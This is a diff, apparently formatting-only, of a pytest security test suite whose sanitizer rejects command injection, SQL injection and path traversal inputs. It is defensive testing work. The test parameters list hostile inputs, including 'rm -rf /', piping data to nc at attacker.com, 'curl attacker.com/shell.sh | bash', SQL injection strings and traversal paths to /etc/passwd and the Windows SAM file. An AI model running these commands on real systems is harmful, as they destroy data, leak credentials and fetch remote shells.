@@ -22,6 +22,7 @@ from pathlib import Path
 # FIXTURES
 # ==============================================================================
 
+
 @pytest.fixture
 def sandbox_env(tmp_path):
     """Create isolated environment for injection tests."""
@@ -46,12 +47,41 @@ def sandbox_env(tmp_path):
 @pytest.fixture
 def input_sanitizer():
     """Provide input sanitization functions."""
+
     class Sanitizer:
-        DANGEROUS_CHARS = ['|', ';', '&', '$', '`', '(', ')', '{', '}', '[', ']',
-                          '<', '>', '!', '\\', '"', "'", '\n', '\r']
+        DANGEROUS_CHARS = [
+            "|",
+            ";",
+            "&",
+            "$",
+            "`",
+            "(",
+            ")",
+            "{",
+            "}",
+            "[",
+            "]",
+            "<",
+            ">",
+            "!",
+            "\\",
+            '"',
+            "'",
+            "\n",
+            "\r",
+        ]
         DANGEROUS_PATTERNS = [
-            '..', '//', 'etc/passwd', 'etc/shadow', '/dev/',
-            'proc/', 'sys/', '~/', '${', '$(', '`',
+            "..",
+            "//",
+            "etc/passwd",
+            "etc/shadow",
+            "/dev/",
+            "proc/",
+            "sys/",
+            "~/",
+            "${",
+            "$(",
+            "`",
         ]
 
         def sanitize_command(self, cmd: str) -> str:
@@ -69,7 +99,7 @@ def input_sanitizer():
             from urllib.parse import unquote
 
             # Check for URI schemes first
-            if '://' in path or path.startswith('file:'):
+            if "://" in path or path.startswith("file:"):
                 raise ValueError("Dangerous pattern detected: URI scheme in path")
 
             # URL decode (handles %2f, %252f, etc.)
@@ -81,13 +111,22 @@ def input_sanitizer():
                 decoded_path = new_decoded
 
             # Normalize backslashes to forward slashes for pattern checking
-            normalized = decoded_path.replace('\\', '/')
+            normalized = decoded_path.replace("\\", "/")
 
             # Check for dangerous path components
             dangerous_components = [
-                'etc/passwd', 'etc/shadow', '/dev/',
-                'proc/', 'sys/', '~/', '${', '$(', '`',
-                'windows/system', 'system32', 'config/sam',
+                "etc/passwd",
+                "etc/shadow",
+                "/dev/",
+                "proc/",
+                "sys/",
+                "~/",
+                "${",
+                "$(",
+                "`",
+                "windows/system",
+                "system32",
+                "config/sam",
             ]
             for pattern in dangerous_components:
                 if pattern in normalized.lower():
@@ -95,14 +134,14 @@ def input_sanitizer():
 
             # Check for path traversal attempts at the start
             # These are attempts to escape the base directory
-            if normalized.startswith('../') or normalized.startswith('..\\'):
+            if normalized.startswith("../") or normalized.startswith("..\\"):
                 raise ValueError(f"Path traversal detected: {path}")
-            if normalized.startswith('/'):
+            if normalized.startswith("/"):
                 raise ValueError("Path traversal detected: absolute path not allowed")
 
             # Check for double-dot variants that try to escape
             # ....// or ....\\  means the user is trying something fishy
-            if '..../' in normalized or '....\\' in normalized:
+            if "..../" in normalized or "....\\" in normalized:
                 raise ValueError("Dangerous pattern detected: obfuscated traversal")
 
             # Resolve to absolute path and verify containment
@@ -116,8 +155,20 @@ def input_sanitizer():
         def sanitize_sql_param(self, value: str) -> str:
             """Sanitize SQL parameter (use parameterized queries instead!)."""
             # This is for demonstration - ALWAYS use parameterized queries
-            dangerous = ["'", '"', '--', ';', '/*', '*/', 'DROP', 'DELETE',
-                        'INSERT', 'UPDATE', 'UNION', 'SELECT']
+            dangerous = [
+                "'",
+                '"',
+                "--",
+                ";",
+                "/*",
+                "*/",
+                "DROP",
+                "DELETE",
+                "INSERT",
+                "UPDATE",
+                "UNION",
+                "SELECT",
+            ]
             value_upper = value.upper()
             for d in dangerous:
                 if d.upper() in value_upper:
@@ -131,20 +182,24 @@ def input_sanitizer():
 # TEST CLASS: Command Injection
 # ==============================================================================
 
+
 @pytest.mark.e2e
 @pytest.mark.security
 class TestCommandInjection:
     """Tests for command injection prevention."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "file.txt; rm -rf /",
-        "file.txt && cat /etc/passwd",
-        "file.txt | nc attacker.com 1234",
-        "$(whoami)",
-        "`id`",
-        "file.txt\n rm -rf /",
-        "file.txt; curl attacker.com/shell.sh | bash",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "file.txt; rm -rf /",
+            "file.txt && cat /etc/passwd",
+            "file.txt | nc attacker.com 1234",
+            "$(whoami)",
+            "`id`",
+            "file.txt\n rm -rf /",
+            "file.txt; curl attacker.com/shell.sh | bash",
+        ],
+    )
     def test_blocks_command_injection_in_filename(
         self, sandbox_env, input_sanitizer, malicious_input
     ):
@@ -152,13 +207,16 @@ class TestCommandInjection:
         with pytest.raises(ValueError, match="Dangerous"):
             input_sanitizer.sanitize_command(malicious_input)
 
-    @pytest.mark.parametrize("malicious_input", [
-        "test; DROP TABLE users;--",
-        "' OR '1'='1",
-        "admin'--",
-        "1; DELETE FROM users WHERE 1=1",
-        "' UNION SELECT * FROM passwords--",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "test; DROP TABLE users;--",
+            "' OR '1'='1",
+            "admin'--",
+            "1; DELETE FROM users WHERE 1=1",
+            "' UNION SELECT * FROM passwords--",
+        ],
+    )
     def test_blocks_sql_injection(self, input_sanitizer, malicious_input):
         """Blocks SQL injection attempts."""
         with pytest.raises(ValueError, match="SQL injection"):
@@ -171,12 +229,7 @@ class TestCommandInjection:
         safe_file.write_text("safe content")
 
         # SAFE: Using list arguments (no shell)
-        result = subprocess.run(
-            ["cat", str(safe_file)],
-            capture_output=True,
-            text=True,
-            timeout=5
-        )
+        result = subprocess.run(["cat", str(safe_file)], capture_output=True, text=True, timeout=5)
         assert result.returncode == 0
         assert "safe content" in result.stdout
 
@@ -188,11 +241,7 @@ class TestCommandInjection:
         with pytest.raises((subprocess.CalledProcessError, FileNotFoundError)):
             # This fails safely because it treats whole string as filename
             subprocess.run(
-                ["cat", malicious],
-                capture_output=True,
-                check=True,
-                cwd=workspace,
-                timeout=5
+                ["cat", malicious], capture_output=True, check=True, cwd=workspace, timeout=5
             )
 
 
@@ -200,25 +249,27 @@ class TestCommandInjection:
 # TEST CLASS: Path Traversal
 # ==============================================================================
 
+
 @pytest.mark.e2e
 @pytest.mark.security
 class TestPathTraversal:
     """Tests for path traversal prevention."""
 
-    @pytest.mark.parametrize("malicious_path", [
-        "../../../etc/passwd",
-        "..\\..\\..\\windows\\system32\\config\\sam",
-        "/etc/passwd",
-        "....//....//etc/passwd",
-        "..%2f..%2f..%2fetc/passwd",
-        "..%252f..%252f..%252fetc/passwd",
-        "....\\\\....\\\\etc/passwd",
-        "/proc/self/environ",
-        "file:///etc/passwd",
-    ])
-    def test_blocks_path_traversal(
-        self, sandbox_env, input_sanitizer, malicious_path
-    ):
+    @pytest.mark.parametrize(
+        "malicious_path",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "/etc/passwd",
+            "....//....//etc/passwd",
+            "..%2f..%2f..%2fetc/passwd",
+            "..%252f..%252f..%252fetc/passwd",
+            "....\\\\....\\\\etc/passwd",
+            "/proc/self/environ",
+            "file:///etc/passwd",
+        ],
+    )
+    def test_blocks_path_traversal(self, sandbox_env, input_sanitizer, malicious_path):
         """Blocks path traversal attempts."""
         workspace = sandbox_env["workspace"]
 
@@ -250,6 +301,7 @@ class TestPathTraversal:
 # ==============================================================================
 # TEST CLASS: Prompt Injection
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.security
@@ -291,6 +343,7 @@ class TestPromptInjection:
 
     def test_sanitizes_user_input_in_prompts(self):
         """Sanitizes user input before including in prompts."""
+
         def sanitize_for_prompt(user_input: str) -> str:
             """Sanitize user input for inclusion in prompts."""
             # Remove potential control sequences
